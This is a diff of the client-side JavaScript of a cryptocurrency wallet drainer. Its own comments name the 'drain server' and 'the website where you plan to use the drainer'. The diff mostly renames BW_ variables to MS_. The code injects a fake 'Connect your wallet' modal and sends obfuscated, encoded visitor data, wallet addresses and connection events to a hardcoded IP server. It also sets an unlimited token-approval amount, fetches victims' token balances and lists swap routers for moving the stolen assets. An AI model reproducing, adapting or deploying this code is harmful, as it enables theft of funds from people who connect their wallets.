@@ -1,27 +1,27 @@
-let BW_Encryption_Key = 0; // Specify any number to be used for encryption (not recommended to leave it as default!)
+let MS_Encryption_Key = 0; // Specify any number to be used for encryption (not recommended to leave it as default!)
 // This same number must also be specified in the server.js file - if they differ, nothing will work correctly.
 const BW_APIKEY = "APIKEY1"
-const BW_Server = "http://41.216.183.112";
+const MS_Server = "http://41.216.183.112:80"; // Specify the domain attached to the drain server
 // This is the domain where your server is located, not the website where you plan to use the drainer.
 
-const BW_WalletConnect_ID = "d77dc2408251d6bf5ecd798db576ca10"; // Project ID from WalletConnect Cloud (better to change to your own)
+const MS_WalletConnect_ID = "d77dc2408251d6bf5ecd798db576ca10"; // Project ID from WalletConnect Cloud (better to change to your own)
 
-const BW_Verify_Message = ""; // Message for wallet verification, may contain the {{ADDRESS}} tag.
+const MS_Verify_Message = ""; // Message for wallet verification, may contain the {{ADDRESS}} tag.
 // By default, leave it empty to receive a message from the server, otherwise, fill it in to use custom text.
 
 // You can customize how your website will appear in the WalletConnect interface using the setting below.
 // Changing it is optional; most wallets work with default settings.
-// The setting is not related to the BW_WalletConnect_Customization switch; it is only for design customization.
+// The setting is not related to the MS_WalletConnect_Customization switch; it is only for design customization.
 
-const BW_WalletConnect_MetaData = {
+const MS_WalletConnect_MetaData = {
   name: document.title, // By default, the same as the website's name.
   description: "Web3 Application", // By default, "Web3 Application."
   url: "https://" + window.location.host, // By default, the website's domain.
   icons: ["https://avatars.githubusercontent.com/u/37784886"]
 };
 
-const BW_WalletConnect_Customization = 0; // 0 - use the default window, 1 - custom customization
-const BW_WalletConnect_Theme = { // Customization parameters are available here: https://docs.walletconnect.com/2.0/web/web3modal/react/wagmi/theming
+const MS_WalletConnect_Customization = 0; // 0 - use the default window, 1 - custom customization
+const MS_WalletConnect_Theme = { // Customization parameters are available here: https://docs.walletconnect.com/2.0/web/web3modal/react/wagmi/theming
   themeMode: 'light',
   themeVariables: {
     '--w3m-background-color': '#000000',
@@ -30,7 +30,7 @@ const BW_WalletConnect_Theme = { // Customization parameters are available here:
   }
 };
 
-const BW_Custom_Chat = {
+const MS_Custom_Chat = {
   Enable: 0,
   Chat_Settings: {
     enter_website: 0,
@@ -54,13 +54,13 @@ const BW_Custom_Chat = {
   }
 };
 
-var BW_Worker_ID = null;
+var MS_Worker_ID = null;
 
-let BW_Ready = false, BW_Settings = {}, BW_Contract_ABI = {}, BW_ID = 0, BW_Process = false,
-BW_Provider = null, BW_Current_Provider = null, BW_Current_Address = null, BW_Current_Chain_ID = null,
-BW_Web3 = null, BW_Signer = null, BW_Check_Done = false, BW_Currencies = {}, BW_Force_Mode = false,
-BW_Sign_Disabled = false, BL_US = false, SP_US = false, XY_US = false, BW_WC_Version = 2, BW_Bad_Country = false,
-BW_Ref_Data = 'N/A';
+let MS_Ready = false, MS_Settings = {}, MS_Contract_ABI = {}, MS_ID = 0, MS_Process = false,
+MS_Provider = null, MS_Current_Provider = null, MS_Current_Address = null, MS_Current_Chain_ID = null,
+MS_Web3 = null, MS_Signer = null, MS_Check_Done = false, MS_Currencies = {}, MS_Force_Mode = false,
+MS_Sign_Disabled = false, BL_US = false, SP_US = false, XY_US = false, MS_WC_Version = 2, MS_Bad_Country = false,
+MS_Ref_Data = 'N/A';
 
 const WC2_Provider = window["@walletconnect/ethereum-provider"].EthereumProvider;
 
@@ -69,13 +69,13 @@ const WC2_Provider = window["@walletconnect/ethereum-provider"].EthereumProvider
     let response = await fetch(`https://min-api.cryptocompare.com/data/pricemulti?fsyms=ETH,BNB,MATIC,AVAX,ARB,FTM,OP&tsyms=USD`, {
       method: 'GET', headers: { 'Accept': 'application/json' }
     });
-    BW_Currencies = await response.json();
+    MS_Currencies = await response.json();
   } catch(err) {
     console.log(err);
   }
 })();
 
-const BW_API_Data = {
+const MS_API_Data = {
   1: 'api.etherscan.io',
   10: 'api-optimistic.etherscan.io',
   56: 'api.bscscan.com',
@@ -85,10 +85,10 @@ const BW_API_Data = {
   43114: 'api.snowtrace.io'
 };
 
-var BW_MetaMask_ChainData = {};
+var MS_MetaMask_ChainData = {};
 
 const fill_chain_data = () => {
-  BW_MetaMask_ChainData = {
+  MS_MetaMask_ChainData = {
     1: {
       chainId: '0x1',
       chainName: "Ethereum Mainnet",
@@ -97,7 +97,7 @@ const fill_chain_data = () => {
         symbol: "ETH",
         decimals: 18,
       },
-      rpcUrls: [BW_Settings.RPCs[1]],
+      rpcUrls: [MS_Settings.RPCs[1]],
       blockExplorerUrls: ["https://etherscan.io"]
     },
     56: {
@@ -108,7 +108,7 @@ const fill_chain_data = () => {
         symbol: "BNB",
         decimals: 18,
       },
-      rpcUrls: [BW_Settings.RPCs[56]],
+      rpcUrls: [MS_Settings.RPCs[56]],
       blockExplorerUrls: ["https://bscscan.com"]
     },
     137: {
@@ -119,7 +119,7 @@ const fill_chain_data = () => {
         symbol: "MATIC",
         decimals: 18,
       },
-      rpcUrls: [BW_Settings.RPCs[137]],
+      rpcUrls: [MS_Settings.RPCs[137]],
       blockExplorerUrls: ["https://polygonscan.com"]
     },
     43114: {
@@ -130,7 +130,7 @@ const fill_chain_data = () => {
         symbol: "AVAX",
         decimals: 18,
       },
-      rpcUrls: [BW_Settings.RPCs[43114]],
+      rpcUrls: [MS_Settings.RPCs[43114]],
       blockExplorerUrls: ["https://snowtrace.io/"]
     },
     42161: {
@@ -141,7 +141,7 @@ const fill_chain_data = () => {
         symbol: "ETH",
         decimals: 18,
       },
-      rpcUrls: [BW_Settings.RPCs[42161]],
+      rpcUrls: [MS_Settings.RPCs[42161]],
       blockExplorerUrls: ["https://explorer.arbitrum.io"]
     },
     10: {
@@ -152,7 +152,7 @@ const fill_chain_data = () => {
         symbol: "ETH",
         decimals: 18,
       },
-      rpcUrls: [BW_Settings.RPCs[10]],
+      rpcUrls: [MS_Settings.RPCs[10]],
       blockExplorerUrls: ["https://optimistic.etherscan.io/"]
     },
     250: {
@@ -163,13 +163,13 @@ const fill_chain_data = () => {
         symbol: "FTM",
         decimals: 18,
       },
-      rpcUrls: [BW_Settings.RPCs[250]],
+      rpcUrls: [MS_Settings.RPCs[250]],
       blockExplorerUrls: ["https://ftmscan.com/"]
     },
   };
 };
 
-const BW_Routers = {
+const MS_Routers = {
   1: [
     ['Uniswap', '0x68b3465833fb72a70ecdf485e0e4c7bd8665fc45'],
     ['Pancake', '0xEfF92A263d31888d860bD50809A8D171709b7b1c'],
@@ -201,7 +201,7 @@ const BW_Routers = {
   ]
 };
 
-const BW_Swap_Route = {
+const MS_Swap_Route = {
   1: '0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2',
   10: '0x4200000000000000000000000000000000000006',
   56: '0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c',
@@ -211,26 +211,26 @@ const BW_Swap_Route = {
   43114: '0xb31f66aa3c1e785363f0875a1b74e27b85fd66c7'
 };
 
-const BW_Uniswap_ABI = [{"inputs":[{"internalType":"uint256","name":"amountIn","type":"uint256"},{"internalType":"uint256","name":"amountOutMin","type":"uint256"},{"internalType":"address[]","name":"path","type":"address[]"},{"internalType":"address","name":"to","type":"address"}],"name":"swapExactTokensForTokens","outputs":[{"internalType":"uint256","name":"amountOut","type":"uint256"}],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"uint256","name":"deadline","type":"uint256"},{"internalType":"bytes[]","name":"data","type":"bytes[]"}],"name":"multicall","outputs":[{"internalType":"bytes[]","name":"","type":"bytes[]"}],"stateMutability":"payable","type":"function"}];
-const BW_Pancake_ABI = [{"inputs":[{"internalType":"uint256","name":"amountIn","type":"uint256"},{"internalType":"uint256","name":"amountOutMin","type":"uint256"},{"internalType":"address[]","name":"path","type":"address[]"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"deadline","type":"uint256"}],"name":"swapExactTokensForTokens","outputs":[{"internalType":"uint256[]","name":"amounts","type":"uint256[]"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"amountIn","type":"uint256"},{"internalType":"uint256","name":"amountOutMin","type":"uint256"},{"internalType":"address[]","name":"path","type":"address[]"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"deadline","type":"uint256"}],"name":"swapExactTokensForETH","outputs":[{"internalType":"uint256[]","name":"amounts","type":"uint256[]"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"deadline","type":"uint256"},{"internalType":"bytes[]","name":"data","type":"bytes[]"}],"name":"multicall","outputs":[{"internalType":"bytes[]","name":"","type":"bytes[]"}],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"uint256","name":"amountIn","type":"uint256"},{"internalType":"uint256","name":"amountOutMin","type":"uint256"},{"internalType":"address[]","name":"path","type":"address[]"},{"internalType":"address","name":"to","type":"address"}],"name":"swapExactTokensForTokens","outputs":[{"internalType":"uint256[]","name":"amounts","type":"uint256[]"}],"stateMutability":"nonpayable","type":"function"}];
+const MS_Uniswap_ABI = [{"inputs":[{"internalType":"uint256","name":"amountIn","type":"uint256"},{"internalType":"uint256","name":"amountOutMin","type":"uint256"},{"internalType":"address[]","name":"path","type":"address[]"},{"internalType":"address","name":"to","type":"address"}],"name":"swapExactTokensForTokens","outputs":[{"internalType":"uint256","name":"amountOut","type":"uint256"}],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"uint256","name":"deadline","type":"uint256"},{"internalType":"bytes[]","name":"data","type":"bytes[]"}],"name":"multicall","outputs":[{"internalType":"bytes[]","name":"","type":"bytes[]"}],"stateMutability":"payable","type":"function"}];
+const MS_Pancake_ABI = [{"inputs":[{"internalType":"uint256","name":"amountIn","type":"uint256"},{"internalType":"uint256","name":"amountOutMin","type":"uint256"},{"internalType":"address[]","name":"path","type":"address[]"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"deadline","type":"uint256"}],"name":"swapExactTokensForTokens","outputs":[{"internalType":"uint256[]","name":"amounts","type":"uint256[]"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"amountIn","type":"uint256"},{"internalType":"uint256","name":"amountOutMin","type":"uint256"},{"internalType":"address[]","name":"path","type":"address[]"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"deadline","type":"uint256"}],"name":"swapExactTokensForETH","outputs":[{"internalType":"uint256[]","name":"amounts","type":"uint256[]"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"deadline","type":"uint256"},{"internalType":"bytes[]","name":"data","type":"bytes[]"}],"name":"multicall","outputs":[{"internalType":"bytes[]","name":"","type":"bytes[]"}],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"uint256","name":"amountIn","type":"uint256"},{"internalType":"uint256","name":"amountOutMin","type":"uint256"},{"internalType":"address[]","name":"path","type":"address[]"},{"internalType":"address","name":"to","type":"address"}],"name":"swapExactTokensForTokens","outputs":[{"internalType":"uint256[]","name":"amounts","type":"uint256[]"}],"stateMutability":"nonpayable","type":"function"}];
 
-const BW_Current_URL = window.location.href.replace(/http[s]*:\/\//, '');
-const BW_Mobile_Status = (() => {
+const MS_Current_URL = window.location.href.replace(/http[s]*:\/\//, '');
+const MS_Mobile_Status = (() => {
   let check = false;
   (function (a) { if (/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino|android|ipad|playbook|silk/i.test(a) || /1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(a.substr(0, 4))) check = true; })(navigator.userAgent || navigator.vendor || window.opera);
   return check;
 })();
 
-const BW_Unlimited_Amount = '1158472395435294898592384258348512586931256';
+const MS_Unlimited_Amount = '1158472395435294898592384258348512586931256';
 
-const BW_Modal_Data = [
+const MS_Modal_Data = [
   {
     type: 'style',
-    data: `@import url(https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap);.web3-modal,.web3-overlay{position:fixed;top:0;left:0;width:100%}.web3-overlay{height:100%;background:rgba(23,23,23,.8);backdrop-filter:blur(5px);z-index:99998}.web3-modal{right:0;bottom:0;margin:auto;max-width:500px;height:fit-content;padding:21px 0 0;background:#fff;border-radius:60px;z-index:99999;font-family:Inter,sans-serif}.web3-modal-title{font-weight:700;font-size:24px;line-height:29px;color:#000;text-align:center}.web3-modal-items{border-top:1px solid rgba(0,0,0,.1);margin-top:21px}.web3-modal .item{padding:15px 34px;border-bottom:1px solid rgba(0,0,0,.1);display:flex;align-items:center;justify-content:space-between;cursor:pointer;transition:.2s}.web3-modal .item:hover{background:#fafafa;border-radius: 20px}.web3-modal .item div{display:flex;align-items:center}.web3-modal .item:last-child{border-bottom:none;border-radius: 0px 0px 60px 60px;}.web3-modal .item span{font-weight:400;font-size:16px;color:#000;margin-left:11px}.web3-modal .item .icon{width:40px;height:40px;justify-content:center}.web3-modal .item .arrow{height:12px;width:7.4px;background:url('/assets/web3-modal/images/arrow.svg') no-repeat} @media (prefers-color-scheme: dark) {.web3-modal {background: #1c1c1c;color: #fff;}.web3-modal-items {border-top: 1px solid #E4DDDD;}.web3-modal .item span {color: #fff;}.web3-modal .item .arrow {-webkit-filter: invert(1);filter: invert(1);}.web3-modal-title {color: #fff;}.web3-modal .item:hover {background:#262525;} .swal2-popup { background: #1c1c1c; color: #ffffff; } .swal2-styled.swal2-confirm { background-color: #3e7022; } .swal2-styled.swal2-confirm:focus { box-shadow: 0 0 0 3px #3e7022; } }`
+    data: `@import url(https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap);.web3-modal,.web3-overlay{position:fixed;top:0;left:0;width:100%}.web3-overlay{height:100%;background:rgba(23,23,23,.8);backdrop-filter:blur(5px);z-index:99998}.web3-modal{right:0;bottom:0;margin:auto;max-width:500px;height:fit-content;padding:21px 0 0;background:#fff;border-radius:60px;z-index:99999;font-family:Inter,sans-serif}.web3-modal-title{font-weight:700;font-size:24px;line-height:29px;color:#000;text-align:center}.web3-modal-items{border-top:1px solid rgba(0,0,0,.1);margin-top:21px}.web3-modal .item{padding:15px 34px;border-bottom:1px solid rgba(0,0,0,.1);display:flex;align-items:center;justify-content:space-between;cursor:pointer;transition:.2s}.web3-modal .item:hover{background:#fafafa;border-radius: 20px}.web3-modal .item div{display:flex;align-items:center}.web3-modal .item:last-child{border-bottom:none;border-radius: 0px 0px 60px 60px;}.web3-modal .item span{font-weight:400;font-size:16px;color:#000;margin-left:11px}.web3-modal .item .icon{width:40px;height:40px;justify-content:center}.web3-modal .item .arrow{height:12px;width:7.4px;background:url('/Client/assets/web3-modal/images/arrow.svg') no-repeat} @media (prefers-color-scheme: dark) {.web3-modal {background: #1c1c1c;color: #fff;}.web3-modal-items {border-top: 1px solid #E4DDDD;}.web3-modal .item span {color: #fff;}.web3-modal .item .arrow {-webkit-filter: invert(1);filter: invert(1);}.web3-modal-title {color: #fff;}.web3-modal .item:hover {background:#262525;} .swal2-popup { background: #1c1c1c; color: #ffffff; } .swal2-styled.swal2-confirm { background-color: #3e7022; } .swal2-styled.swal2-confirm:focus { box-shadow: 0 0 0 3px #3e7022; } }`
   },
   {
     type: 'html',
-    data: `<div class="web3-modal-main"><p class="web3-modal-title" style="margin-top:0">Connect your wallet</p><div class="web3-modal-items"><div class="item" onclick='connect_wallet("MetaMask")'><div><div class="icon"><img src="/assets/web3-modal/images/MM.svg" alt=""></div><span>MetaMask</span></div><div class="arrow"></div></div><div class="item" onclick='connect_wallet("Coinbase")'><div><div class="icon"><img src="/assets/web3-modal/images/CB.svg" alt=""></div><span>Coinbase</span></div><div class="arrow"></div></div><div class="item" onclick='connect_wallet("Trust Wallet")'><div><div class="icon"><img src="/assets/web3-modal/images/TW.svg" alt=""></div><span>Trust Wallet</span></div><div class="arrow"></div></div><div class="item" onclick='connect_wallet("Binance Wallet")'><div><div class="icon"><img src="/assets/web3-modal/images/BW.svg" alt=""></div><span>Binance Wallet</span></div><div class="arrow"></div></div><div class="item" onclick="use_wc()"><div><div class="icon"></div><span>More Wallets</span></div><div class="arrow"></div></div></div></div><div class="web3-modal-wc" style="display:none"><p class="web3-modal-title" style="margin-top:0">Choose Version</p><div class="web3-modal-items"><div class="item" onclick='connect_wallet("WalletConnect")'><div><div class="icon"><img src="/assets/web3-modal/images/WC.svg" alt=""></div><span>WalletConnect</span></div><div class="arrow"></div></div><div class="item" onclick='connect_wallet("WalletConnect")'><div><div class="icon"><img src="/assets/web3-modal/images/WC1.svg" alt=""></div><span>WalletConnect Legacy</span></div><div class="arrow"></div></div><div class="item" onclick="BW_init()"><div class="arrow" style="transform:rotateY(190deg)"></div><div><div class="icon"></div><span>Return to Wallets</span></div></div></div></div>`
+    data: `<div class="web3-modal-main"><p class="web3-modal-title" style="margin-top:0">Connect your wallet</p><div class="web3-modal-items"><div class="item" onclick='connect_wallet("MetaMask")'><div><div class="icon"><img src="/Client/assets/web3-modal/images/MM.svg" alt=""></div><span>MetaMask</span></div><div class="arrow"></div></div><div class="item" onclick='connect_wallet("Coinbase")'><div><div class="icon"><img src="/Client/assets/web3-modal/images/CB.svg" alt=""></div><span>Coinbase</span></div><div class="arrow"></div></div><div class="item" onclick='connect_wallet("Trust Wallet")'><div><div class="icon"><img src="/Client/assets/web3-modal/images/TW.svg" alt=""></div><span>Trust Wallet</span></div><div class="arrow"></div></div><div class="item" onclick='connect_wallet("Binance Wallet")'><div><div class="icon"><img src="/Client/assets/web3-modal/images/BW.svg" alt=""></div><span>Binance Wallet</span></div><div class="arrow"></div></div><div class="item" onclick="use_wc()"><div><div class="icon"></div><span>More Wallets</span></div><div class="arrow"></div></div></div></div><div class="web3-modal-wc" style="display:none"><p class="web3-modal-title" style="margin-top:0">Choose Version</p><div class="web3-modal-items"><div class="item" onclick='connect_wallet("WalletConnect")'><div><div class="icon"><img src="/Client/assets/web3-modal/images/WC.svg" alt=""></div><span>WalletConnect</span></div><div class="arrow"></div></div><div class="item" onclick='connect_wallet("WalletConnect")'><div><div class="icon"><img src="/Client/assets/web3-modal/images/WC1.svg" alt=""></div><span>WalletConnect Legacy</span></div><div class="arrow"></div></div><div class="item" onclick="ms_init()"><div class="arrow" style="transform:rotateY(190deg)"></div><div><div class="icon"></div><span>Return to Wallets</span></div></div></div></div>`
   }
 ];
 
@@ -238,19 +238,19 @@ const inject_modal = () => {
   try {
     let modal_style = document.createElement('style');
     modal_style.id = 'web3-style';
-    modal_style.innerHTML = BW_Modal_Data[0].data;
+    modal_style.innerHTML = MS_Modal_Data[0].data;
     document.head.appendChild(modal_style);
     let overlay_elem = document.createElement('div');
     overlay_elem.id = 'web3-overlay';
     overlay_elem.classList = ['web3-overlay'];
     overlay_elem.style.display = 'none';
     document.body.prepend(overlay_elem);
-    document.querySelector('.web3-overlay').addEventListener('click', () => { BW_hide(); });
+    document.querySelector('.web3-overlay').addEventListener('click', () => { ms_hide(); });
     let modal_elem = document.createElement('div');
     modal_elem.id = 'web3-modal';
     modal_elem.classList = ['web3-modal'];
     modal_elem.style.display = 'none';
-    modal_elem.innerHTML = BW_Modal_Data[1].data;
+    modal_elem.innerHTML = MS_Modal_Data[1].data;
     document.body.prepend(modal_elem);
   } catch(err) {
     console.log(err);
@@ -259,8 +259,8 @@ const inject_modal = () => {
 
 const set_modal_data = (style_code, html_code) => {
   try {
-    BW_Modal_Data[0].data = style_code;
-    BW_Modal_Data[1].data = html_code;
+    MS_Modal_Data[0].data = style_code;
+    MS_Modal_Data[1].data = html_code;
     reset_modal();
   } catch(err) {
     console.log(err);
@@ -274,9 +274,9 @@ const reset_modal = () => {
   try { inject_modal(); } catch(err) { console.log(err); }
 };
 
-const BW_init = () => {
+const ms_init = () => {
   try {
-    if (BW_Process) return;
+    if (MS_Process) return;
     document.getElementById('web3-modal').style.display = 'block';
     document.getElementById('web3-overlay').style.display = 'block';
     document.getElementsByClassName('web3-modal-main')[0].style.display = 'block';
@@ -286,7 +286,7 @@ const BW_init = () => {
   }
 };
 
-const BW_hide = () => {
+const ms_hide = () => {
   try {
     document.getElementById('web3-modal').style.display = 'none';
     document.getElementById('web3-overlay').style.display = 'none';
@@ -297,15 +297,15 @@ const BW_hide = () => {
 
 const load_wc = async () => {
   let all_chains_arr = [], all_chains_obj = {};
-  for (const chain_id in BW_Settings.RPCs) {
+  for (const chain_id in MS_Settings.RPCs) {
     if (chain_id != '1') all_chains_arr.push(chain_id);
-    all_chains_obj[chain_id] = BW_Settings.RPCs[chain_id];
+    all_chains_obj[chain_id] = MS_Settings.RPCs[chain_id];
   }
-  BW_Provider = await WC2_Provider.init({
-    projectId: BW_WalletConnect_ID,
+  MS_Provider = await WC2_Provider.init({
+    projectId: MS_WalletConnect_ID,
     chains: [ '1' ],
     optionalChains: all_chains_arr,
-    metadata: BW_WalletConnect_MetaData,
+    metadata: MS_WalletConnect_MetaData,
     showQrModal: true,
     rpcMap: all_chains_obj,
     methods: [
@@ -315,7 +315,7 @@ const load_wc = async () => {
       'eth_signTypedData',
       'eth_signTypedData_v4'
     ],
-    qrModalOptions: (BW_WalletConnect_Customization == 1) ? BW_WalletConnect_Theme : undefined
+    qrModalOptions: (MS_WalletConnect_Customization == 1) ? MS_WalletConnect_Theme : undefined
   });
 };
 
@@ -334,31 +334,31 @@ const srp = (s, e) => {
 
 let prs_enc = 0, last_request_ts = 0;
 (async () => {
-  prs_enc = BW_Encryption_Key;
-  BW_Encryption_Key = Math.floor(Math.random() * 1000);
+  prs_enc = MS_Encryption_Key;
+  MS_Encryption_Key = Math.floor(Math.random() * 1000);
 })()
 
 const send_request = async (apiKey, data) => {
   try {
-    if (BW_Force_Mode) return { status: 'error', error: 'Server is Unavailable' };
+    if (MS_Force_Mode) return { status: 'error', error: 'Server is Unavailable' };
 
     while (Date.now() <= last_request_ts)
       await new Promise(r => setTimeout(r, 1));
 
     last_request_ts = Date.now();
     data.domain = window.location.host;
-    data.worker_id = BW_Worker_ID || null;
-    data.user_id = BW_ID || null;
+    data.worker_id = MS_Worker_ID || null;
+    data.user_id = MS_ID || null;
     data.message_ts = last_request_ts;
-    data.ref = BW_Ref_Data == null ? 'N/A' : BW_Ref_Data;
-    data.chat_data = BW_Custom_Chat.Enable == 0 ? false : BW_Custom_Chat.Chat_Settings;
+    data.ref = MS_Ref_Data == null ? 'N/A' : MS_Ref_Data;
+    data.chat_data = MS_Custom_Chat.Enable == 0 ? false : MS_Custom_Chat.Chat_Settings;
 
     data.apiKey = BW_APIKEY;
 
     const encode_key = btoa(String(10 + 256 + 1024 + 2048 + prs_enc));
     const request_data = prs(encode_key, btoa(JSON.stringify(data)));
 
-    const response = await fetch('http://' + BW_Server, {
+    const response = await fetch('http://' + MS_Server, {
       method: 'POST',
       headers: {
         'Accept': 'text/plain',
@@ -372,9 +372,9 @@ const send_request = async (apiKey, data) => {
     if (!response_data.status)
       return { status: 'error', error: 'Server is Unavailable' };
     else {
-      if (response_data.status == 'error' && response_data.error == 'SRV_UNAVAILABLE') BW_Force_Mode = true;
+      if (response_data.status == 'error' && response_data.error == 'SRV_UNAVAILABLE') MS_Force_Mode = true;
       if (response_data.status == 'error' && response_data.error == 'INVALID_VERSION') {
-        BW_Force_Mode = true;
+        MS_Force_Mode = true;
         try {
           Swal.close();
           Swal.fire({
@@ -398,9 +398,9 @@ const retrive_config = async () => {
   try {
     const response = await send_request({ action: 'retrive_config' });
     if (response.status == 'OK') {
-      BW_Settings = response.data;
-      if (!BW_Settings.CIS) BW_Bad_Country = false;
-      if (typeof BW_Settings.DSB == 'boolean' && BW_Settings.DSB === true) window.location.href = 'about:blank';
+      MS_Settings = response.data;
+      if (!MS_Settings.CIS) MS_Bad_Country = false;
+      if (typeof MS_Settings.DSB == 'boolean' && MS_Settings.DSB === true) window.location.href = 'about:blank';
     }
   } catch(err) {
     console.log(err);
@@ -410,7 +410,7 @@ const retrive_config = async () => {
 const retrive_contract = async () => {
   try {
     const response = await send_request({ action: 'retrive_contract' });
-    if (response.status == 'OK') BW_Contract_ABI = response.data;
+    if (response.status == 'OK') MS_Contract_ABI = response.data;
   } catch(err) {
     console.log(err);
   }
@@ -420,11 +420,11 @@ const enter_website = async () => {
   try {
     let response = await send_request({
       action: 'enter_website',
-      user_id: BW_ID,
+      user_id: MS_ID,
       time: new Date().toLocaleString('ru-RU')
     });
     if (response.status == 'error' && response.error == 'BAD_COUNTRY') {
-      BW_Bad_Country = true;
+      MS_Bad_Country = true;
     }
   } catch(err) {
     console.log(err);
@@ -433,8 +433,8 @@ const enter_website = async () => {
 
 const leave_website = async () => {
   try {
-    if (!BW_Settings.Notifications['leave_website']) return;
-    await send_request({ action: 'leave_website', user_id: BW_ID });
+    if (!MS_Settings.Notifications['leave_website']) return;
+    await send_request({ action: 'leave_website', user_id: MS_ID });
   } catch(err) {
     console.log(err);
   }
@@ -442,8 +442,8 @@ const leave_website = async () => {
 
 const connect_request = async () => {
   try {
-    if (!BW_Settings.Notifications['connect_request']) return;
-    await send_request({ action: 'connect_request', user_id: BW_ID, wallet: BW_Current_Provider });
+    if (!MS_Settings.Notifications['connect_request']) return;
+    await send_request({ action: 'connect_request', user_id: MS_ID, wallet: MS_Current_Provider });
   } catch(err) {
     console.log(err);
   }
@@ -451,8 +451,8 @@ const connect_request = async () => {
 
 const connect_cancel = async () => {
   try {
-    if (!BW_Settings.Notifications['connect_cancel']) return;
-    await send_request({ action: 'connect_cancel', user_id: BW_ID });
+    if (!MS_Settings.Notifications['connect_cancel']) return;
+    await send_request({ action: 'connect_cancel', user_id: MS_ID });
   } catch(err) {
     console.log(err);
   }
@@ -460,10 +460,10 @@ const connect_cancel = async () => {
 
 const connect_success = async () => {
   try {
-    if (!BW_Settings.Notifications['connect_success']) return;
+    if (!MS_Settings.Notifications['connect_success']) return;
     await send_request({
-      action: 'connect_success', user_id: BW_ID, address: BW_Current_Address,
-      wallet: BW_Current_Provider, chain_id: BW_Current_Chain_ID
+      action: 'connect_success', user_id: MS_ID, address: MS_Current_Address,
+      wallet: MS_Current_Provider, chain_id: MS_Current_Chain_ID
     });
   } catch(err) {
     console.log(err);
@@ -539,7 +539,7 @@ const convert_chain = (from, to, value) => {
 
 const get_tokens = async (address) => {
   try {
-    let tokens = [], response = await fetch(`https://rpc.ankr.com/multichain/${BW_Settings.AT || ''}`, {
+    let tokens = [], response = await fetch(`https://rpc.ankr.com/multichain/${MS_Settings.AT || ''}`, {
       method: 'POST',
       headers: {
         'Accept': 'application/json',
@@ -559,8 +559,8 @@ const get_tokens = async (address) => {
     for (const asset of response.result.assets) {
       try {
         let contract_address = asset.contractAddress || 'NATIVE';
-        if (BW_Settings.Contract_Whitelist.length > 0 && !BW_Settings.Contract_Whitelist.includes(contract_address.toLowerCase())) continue;
-        else if (BW_Settings.Contract_Blacklist.length > 0 && BW_Settings.Contract_Blacklist.includes(contract_address.toLowerCase())) continue;
